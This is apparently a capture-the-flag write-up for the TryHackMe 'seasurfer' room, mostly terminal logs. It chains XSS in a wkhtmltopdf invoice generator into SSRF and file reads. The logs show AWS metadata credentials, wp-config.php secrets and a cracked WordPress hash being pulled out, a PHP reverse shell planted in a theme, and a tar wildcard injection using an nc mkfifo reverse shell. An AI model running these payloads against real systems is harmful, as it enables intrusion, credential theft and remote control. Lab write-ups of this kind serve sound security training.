----
Ride the Wave!
----

![](https://i.imgur.com/yvuFbNQ.jpeg)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/137a8e8a8cdc4ba577b8f841b1d5293b.png)

### Task 1  Let's go!

 Start Machine

It's a beautiful day to hit the beach and do some surfing.

_Please allow up to 5 minutes for the machine to boot up._

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.74.111 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.74.111:22
Open 10.10.74.111:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 18:27 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:27
Completed Parallel DNS resolution of 1 host. at 18:27, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:27
Scanning 10.10.74.111 [2 ports]
Discovered open port 22/tcp on 10.10.74.111
Discovered open port 80/tcp on 10.10.74.111
Completed Connect Scan at 18:27, 0.19s elapsed (2 total ports)
Initiating Service scan at 18:27
Scanning 2 services on 10.10.74.111
Completed Service scan at 18:27, 6.40s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.74.111.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:27
Completed NSE at 18:27, 5.56s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Nmap scan report for 10.10.74.111
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-10 18:27:35 EDT for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87e3d432cd51d29670ef5f482250ab67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyQtbtTbXITp+A3lHCXTmOYEd3nuF2kZuQ02sjsxLFIE31lelQ+yZMOCwzcC/MohqAcs2LLmfdVi2TJfuOVC0dZ6bkMUdbeF65UtptaUClLuxhdtMkZNxJlAgQSx8d0p3H+JnAmTD5CVeU/x0RlTKRzQDiynKtszcrWjWzZ6DGM7rWjTtGcYOaFObWN66bKrZtQOQw2Fp6LX5aNIqAoxhb3orPKjFUUlcdVzaesX2KBbJsNBDiEF3gGtoK6nJzi9L+NMFAK2Rl06G6vBqxYUc6PKL0M+ovoCEtxeZsH9/R2WqWZ3vB2B8PzqafYFP3chMMcdewG89CCdxmyyFuyGt/kf7L7OLJTWsYiJvLUPFAEyymn4GcfzIcOl/XXVr1hIoTOCDukS0dMWdAvnaaZOMharud9fowd+eAG3LowJnyu2O2OBg6pdpdQzuW9DFmy7etBIlbaSvG+l/8pmgJ3RWSLXDQEl5kZDGXLM6A3qcUqtSOK7ww9IvN8IYxlhyQ0kk=
|   256 27d137b0c53cb5816a7c368a2b639ab9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEhRgdpnS6QXS+haDKzUdKS0IP+HZz749jjQOx9ECJ+ypGOT6Q65NUeHaU49cqARe4kKi9/+Yl/W3U2J4wJKgBw=
|   256 7f131bcfe64551b909439a232f503c94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIZ39ZNVX7VJgmO8M/Vhb9lm35it42Ho7crlLqYhVhAT
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:27
Completed NSE at 18:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ curl 10.10.74.111 -I
HTTP/1.1 200 OK
Date: Mon, 10 Jul 2023 22:30:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 17 Apr 2022 18:54:09 GMT
ETag: "2aa6-5dcde2b3f2ff9"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
X-Backend-Server: seasurfer.thm
Content-Type: text/html

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts                                                  
10.10.74.111 seasurfer.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u seasurfer.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.seasurfer.thm" --hc 404 --hw 964
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://seasurfer.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload           
=====================================================================

000000387:   200        108 L    275 W      3072 Ch     "internal"  

or http://seasurfer.thm/news/

dude what was the site again where u could create receipts for customers? the computer is saying cant connect to intrenal.seasurfer.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.74.111 seasurfer.thm internal.seasurfer.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://seasurfer.thm/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://seasurfer.thm/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/10 18:35:37 Starting gobuster in directory enumeration mode
===============================================================
http://seasurfer.thm/0000                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/0000/]
http://seasurfer.thm/.htaccess            (Status: 403) [Size: 278]
http://seasurfer.thm/.htpasswd            (Status: 403) [Size: 278]
http://seasurfer.thm/!                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/0                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/About                (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/A                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/Blog                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/Blog/]
http://seasurfer.thm/B                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/blog/]
http://seasurfer.thm/C                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/contact/]
http://seasurfer.thm/Contact              (Status: 301) [Size: 0] [--> http://seasurfer.thm/Contact/]
http://seasurfer.thm/H                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/home/]
http://seasurfer.thm/Home                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/Home/]
http://seasurfer.thm/N                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/new-website-is-up/]
http://seasurfer.thm/News                 (Status: 301) [Size: 0] [--> http://seasurfer.thm/News/]
http://seasurfer.thm/S                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/sale/]
http://seasurfer.thm/a                    (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/ab                   (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/abo                  (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/about                (Status: 301) [Size: 0] [--> http://seasurfer.thm/]
http://seasurfer.thm/admin                (Status: 302) [Size: 0] [--> http://seasurfer.thm/wp-admin/]
http://seasurfer.thm/adminer              (Status: 301) [Size: 316] [--> http://seasurfer.thm/adminer/]

so http://seasurfer.thm/wp-admin/ to login and http://seasurfer.thm/adminer/ login mysql and pdf generator from subdomain internal

http://internal.seasurfer.thm/invoices/10072023-NMhNcqy3YbDUos3yT96F.pdf

<h1>1337</h1>

<script>document.write(document.location.href)</script>

Additional information: http://internal.seasurfer.thm/invoice.php?
name=a&payment=Credit+card&comment=%3Cscript%3Edocument.write%28document.location.href%29%3C%2Fscript%3E&item1=1&price1
HWjHNv6sJClQVULEFnPb

<img src=x onerror=document.write(navigator.appVersion)>
5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34

<img src=x onerror=document.write(1337)>

let's download the pdf

┌──(witty㉿kali)-[~]
└─$ pdfinfo 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf 
Title:           Receipt
Creator:         wkhtmltopdf 0.12.5
Producer:        Qt 4.8.7
CreationDate:    Mon Jul 10 18:51:40 2023 EDT
Custom Metadata: no
Metadata Stream: no
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       595 x 842 pts (A4)
Page rot:        0
File size:       53159 bytes
Optimized:       no
PDF version:     1.4

or

┌──(witty㉿kali)-[~]
└─$ exiftool 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf                  
ExifTool Version Number         : 12.57
File Name                       : 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf
Directory                       : .
File Size                       : 53 kB
File Modification Date/Time     : 2023:07:10 18:52:26-04:00
File Access Date/Time           : 2023:07:10 18:52:41-04:00
File Inode Change Date/Time     : 2023:07:10 18:52:26-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Receipt
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2023:07:10 22:51:40Z
Page Count                      : 1


<iframe src="http://10.8.19.103:4444/> 

└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from seasurfer.thm [10.10.74.111] 55078
GET /%3E%20%3C/td%3E%3C/tr%3E%3C/table%3E%3C/td%3E%3C/tr%3E%3Ctr%20class= HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://internal.seasurfer.thm/invoice.php?name=a&payment=Credit+card&comment=%3Ciframe+src%3D%22http%3A%2F%2F10.8.19.103%3A4444%2F%3E+&item1=1&price1=1&id=10072023-kfEf4vxgqjpZF2Fylfn8
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.8.19.103:4444

wkhtmltopdf

`XSS` to `SSRF` to `LFI`

<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
<iframe src="file:///etc/passwd"> not work

[AWS Capture the Flag Write-Up (hey.com)](https://world.hey.com/alois/aws-capture-the-flag-write-up-e64fa089)

<iframe src="http://169.254.169.254/latest/dynamic/instance-identity/" height="500" width="500">

signature
rsa2048
document
pkcs7

retrieve a `SecretAccessKey`

<iframe src="http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance" height="1000" width="500">

Additional information: {
"Code" : "Success",
"LastUpdated" : "2023-07-10T22:41:40Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "ASIA2YR2KKQMY6K4737Z",
"SecretAccessKey" :
"DRm8wB8nWsTkQx/k025HNLCY6pK3fFT8f703hAz0",
"Token" :
"IQoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMSJHMEUCIEDq8w+SjTssBi9Lh8y+
aefW2/Ylt6gxE0PRiOgsgjFnAiEAzm/E+cnhw+v2hPGct7SdTGam7ZAJgROou
ruioJHXLLkqzwQIsP//////////ARADGgw3Mzk5MzA0Mjg0NDEiDEzm40kY8baCs
e4bJiqjBHep1ziyH3mj/0e1UBaBNc5cKbXsZIo9iAx4/4xwpwrLSjlsKsG8tc6v4
fVpSAlerKI1LbmotzEUizLe1HVSyrcdBbyaUBjgSjII7oq5nG/vBEvd5BtR0Bc/S
zzzHQcEMYsoqaoy6UrjhHzo8jER+Hz5nD6D1bPSZcAASs8uycb5GiiSRccVzk
GmDH562Tpz8hDmurfdyprQ5dvahEeM3C7iXo2GTgNJqMp2HmtF87tKaOFH
OdXGa7qagUOe/tOhawvIpMQ7GuwI5GBSfCqwXgF4FIFTn0X1tjbibHID+zny
WlN7cU/b5lDYXs6rYwqw/Jskg+tpXWI2eaTmxa+Ma8/y7gNXcz7CynoFElgf9
zzvjHNgslkEDLoOQJJVkr4+gisKt+YVYN8KyF6iVF2tpvU1P901YcU6RMyrP2e
KwjYYLLAgO74614aFXYefPZmO5C+3B1fg1K/4dFd+flJJtt9DS/3O9Y/4TIXjH3
3EG1AAzsWk3Vi2a/W3kSzmc4Yj6AfxYh1rby6RqaBFHK8HnHqMRjZLHhBEv
0K23akLGW2kPdgBm2OUHbE0UblbW07hBll0raqUd4/ZGMSmboGFuzrvAFN
oQdmzTEtFwZelgQJLBS2HlvtE57R6Z+TXzSC3Z+448C1Pag63F/km6tR/HD
XTU/IZAe190rIYNCClP0KMiuLNmRQrif4SB2aBXgbiBlvKOHtiQwaZ7rbQ2aAt
OVNrJ1Ew7JGypQY6kwJlGczY6qsnPCdNGVYH3PJmPl+6iSd6SB+RSPbPKSyfJ
BbPFrrWFQe1mMUqolvAZ02SNCdseGZSvNFNR9nTOHElhYfIWMsRd7wZVs
gchJQSytPiTOIA/f8XeUKcEzz0rQg/bzaTVipORkCHVhrBoSPWWxeWyZG3iCN
3B44d75jR0lL+QRhLtgbAEIKENlupHr3D8zlHTimB1d1Gdaj9J5PUFOtEbFEm
P4Z4LJh/I+txRt9fQ59TbeHbGGZz6nYd+oAhZjTPEfHIjtINV1FW+De6dEHJKZ
CJmnD9jc69baI+yFk/hgEheoVZuVBb8msJJbGaK16Wh/8XbfenTyTa3i85bZ5
9/J+KiD0dkx9DEYcKWAH7IA==",
"Expiration" : "2023-07-11T04:42:19Z"
}

[Write-up for Gemini Inc: 1 - My Learning Journey (kongwenbin.com)](https://kongwenbin.com/write-up-for-gemini-inc-1/)

┌──(witty㉿kali)-[~]
└─$ cat exfiltrate.php  
<?php header('location:file://'.$_REQUEST['x']); ?>

┌──(witty㉿kali)-[~]
└─$ php -S 0.0.0.0:1234 
[Mon Jul 10 19:07:35 2023] PHP 8.1.12 Development Server (http://0.0.0.0:1234) started

<iframe height="2000" width="800" src="http://10.8.19.103:1234/exfiltrate.php?x=/etc/passwd"></iframe>

Additional information:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false

┌──(witty㉿kali)-[~]
└─$ php -S 0.0.0.0:1234 
[Mon Jul 10 19:07:35 2023] PHP 8.1.12 Development Server (http://0.0.0.0:1234) started
[Mon Jul 10 19:08:11 2023] 10.10.74.111:42822 Accepted
[Mon Jul 10 19:08:11 2023] 10.10.74.111:42822 [302]: GET /exfiltrate.php?x=/etc/passwd

<iframe height="2000" width="800" src="http://10.8.19.103:1234/exfiltrate.php?x=/var/www/wordpress/wp-config.php"></iframe>

Additional information:
<?php
/**
* The base configuration for WordPress
*
* The wp-config.php creation script uses this file during the installation.
* You don't have to use the web site, you can copy this file to "wp-config.php"
* and fill in the values.
*
* This file contains the following configurations:
*
* * Database settings
* * Secret keys
* * Database table prefix
* * ABSPATH
*
* @link https://wordpress.org/support/article/editing-wp-config-php/
*
* @package WordPress
*/
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wordpressuser' );
/** Database password */
define( 'DB_PASSWORD', 'coolDataTablesMan' );
/** Database hostname */
define( 'DB_HOST', 'localhost' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
* Authentication unique keys and salts.
*
* Change these to different unique phrases! You can generate these using
* the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
*
* You can change these at any point in time to invalidate all existing cookies.
* This will force all users to have to log in again.
*
* @since 2.6.0

* @since 2.6.0
*/
define('AUTH_KEY', 'SFP(>4};J1<~uW@#Z0~&5eJB@{gEzk2(DE_|k1d/B,b*cZLQu0avhmF^!}u| Mv^');
define('SECURE_AUTH_KEY', '-Z;O^-p6f2S+RWT9`5YT8oh),A5)P]Z9V1g!}*s|OLn@LaTWQd:7(?VPQ38<bK@o');
define('LOGGED_IN_KEY', '-6g}oyB ]-*IhO<:ln2Hd^K`Tf.kJlbDs$rx6+2cF?x|$~`XyKZANE)EG^Xy2-#6');
define('NONCE_KEY', '-*847+C`JbNW5:upCc,#pTjgBxS?H-vI{oG@4Xt.AANh|GuJ0nk/8>7fPHj%-;-f');
define('AUTH_SALT', '4cF?fB2,eGo0]-XiMh-@u`8t|p$YAi@=:}!z<TTF%|Hd#miHV{3{d7!!.1y:WIfE');
define('SECURE_AUTH_SALT', 't&gahvY+N^--}nk( ]3-@}6%NesVZ%!Q<D8E>1~UE-|;C,(vGbl)q>u$lBcx:-T/');
define('LOGGED_IN_SALT', '>k$)D6(!K5H&~+GT~UR)0z?4XVOo<G8G)-J!a~U|fHDyd-8.OLJPcFSR2>X+*eU!');
define('NONCE_SALT', '1Et3q-e44k.NN-U=SEpNnJA/D%O;Ow}`]U!ysu~Qdw6d?CmQw*N2;]W.J-89-@a]');
/**#@-*/
/**
* WordPress database table prefix.
*
* You can have multiple installations in one database if you give each
* a unique prefix. Only numbers, letters, and underscores please!
*/
$table_prefix = 'wp_';
/**
* For developers: WordPress debugging mode.
*
* Change this to true to enable the display of notices during development.
* It is strongly recommended that plugin and theme developers use WP_DEBUG
* in their development environments.
*
* For information on other constants that can be used for debugging,
* visit the documentation.
*
* @link https://wordpress.org/support/article/debugging-in-wordpress/
*/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
define( 'ABSPATH', __DIR__ . '/' );
}
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

then login in /adminer

http://seasurfer.thm/adminer/?username=wordpressuser&db=wordpress

http://seasurfer.thm/adminer/?username=wordpressuser&db=wordpress&select=wp_users

kyle : $P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/

┌──(witty㉿kali)-[~]
└─$ cat hash_seasurfer 
$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/

or just change it :)

┌──(witty㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_seasurfer
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jenny4ever       (?)     
1g 0:00:00:50 DONE (2023-07-10 19:15) 0.01980g/s 9930p/s 9930c/s 9930C/s jenny777..jello33
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 

login

http://seasurfer.thm/wp-admin/?admin_email_remind_later=1

http://seasurfer.thm/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen 

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php                                           
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>  

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://seasurfer.thm/wp-content/themes/twentyseventeen/404.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.74.111] 34810
SOCKET: Shell has connected! PID: 51185
which python
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@seasurfer:/var/www/wordpress/wp-content/themes/twentyseventeen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

or

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.74.111] 34812
SOCKET: Shell has connected! PID: 51218
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null

# Press Ctrl+Z


stty raw -echo; fg; reset;

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;

www-data@seasurfer:/var/www/wordpress/wp-content/themes/twentyseventeen$ cd /var/www/internal/maintenance
cd /var/www/internal/maintenance
www-data@seasurfer:/var/www/internal/maintenance$ ls
ls
backup.sh
www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh
cat backup.sh
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *
www-data@seasurfer:/var/www/internal/maintenance$ cd /var/www/internal/invoices
cd /var/www/internal/invoices
www-data@seasurfer:/var/www/internal/invoices$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" > shell.sh
www-data@seasurfer:/var/www/internal/invoices$ echo ""> "--checkpoint-action=exec=sh shell.sh"
echo ""> "--checkpoint-action=exec=sh shell.sh"
www-data@seasurfer:/var/www/internal/invoices$ echo ""> --checkpoint=1
echo ""> --checkpoint=1
www-data@seasurfer:/var/www/internal/invoices$ ls
ls
'--checkpoint-action=exec=sh shell.sh'	 10072023-HWjHNv6sJClQVULEFnPb.pdf   10072023-RvZI9uENduweGWtPHu6v.pdf	 10072023-f0614GT3xZCekK4yZRAJ.pdf   18042022-x7nvKzdxwDPtGvg3hexH.pdf
'--checkpoint=1'			 10072023-HsCTh0PqnMd9rOLH4WGP.pdf   10072023-T3d9gJ27G3JZVqewFHQB.pdf	 10072023-f4PnrVl2qvcUaSRl2Frs.pdf   19042022-P8SghZ3qVclByyfsSm4c.pdf
 10072023-4Ba5J6QLzHl4dQrhvoIy.pdf	 10072023-Ixe4izWo5Dgetf8bz8wo.pdf   10072023-TL7NzzolfMeW81zTHPD4.pdf	 10072023-kfEf4vxgqjpZF2Fylfn8.pdf   19042022-RuQkG8SZaxQc6vyw7BCv.pdf
 10072023-4Z52Q7sEAy4OO9AvjPRD.pdf	 10072023-MQHDq0QTwIgCF48HJuJX.pdf   10072023-X1J9ntPNub9iUXKREqC6.pdf	 18042022-SZEAfjkefOWOLzNG0nBF.pdf   22042022-NNod4XQ0usiYmPZOVASm.pdf
 10072023-6JNx7UZRbtFUmCAz6rrQ.pdf	 10072023-NMhNcqy3YbDUos3yT96F.pdf   10072023-cyuRo7ZJUUMKPPw4yZQb.pdf	 18042022-lUIvPaOVZIJQarZO7wHP.pdf   shell.sh

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 1338
listening on [any] 1338 ...
connect to [10.8.19.103] from seasurfer.thm [10.10.74.111] 52658
sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
kyle@seasurfer:/var/www/internal/invoices$ 
zsh: suspended  rlwrap nc -lvp 1338
                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ stty raw -echo; fg; reset;
[1]  + continued  rlwrap nc -lvp 1338

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;

kyle@seasurfer:/var/www/internal/invoices$ cd /home
cd /home
kyle@seasurfer:/home$ ls
ls
kyle
kyle@seasurfer:/home$ cd kyle
cd kyle
kyle@seasurfer:~$ ls
ls
backups  snap  user.txt
kyle@seasurfer:~$ cat user.txt
cat user.txt
THM{SSRFING_TO_LFI_TO_RCE}

┌──(witty㉿kali)-[~/Downloads]
└─$ mkdir seasurfer              
                                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ cd seasurfer  

┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/witty/.ssh/id_rsa): /home/witty/Downloads/seasurfer/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/witty/Downloads/seasurfer/id_rsa
Your public key has been saved in /home/witty/Downloads/seasurfer/id_rsa.pub
The key fingerprint is:
SHA256:xpdT+HtUeOi3dc4icYa652WE8bkRRs2FVOve28p98tA witty@kali
The key's randomart image is:
+---[RSA 3072]----+
|             .o=+|
|           . ..o+|
|          . o =.o|
|       .   + B.= |
|        S + = X.+|
|       . . o B.B=|
|          . o BoE|
|           ..*.++|
|          .o. o==|
+----[SHA256]-----+

┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ cat id_rsa.pub 
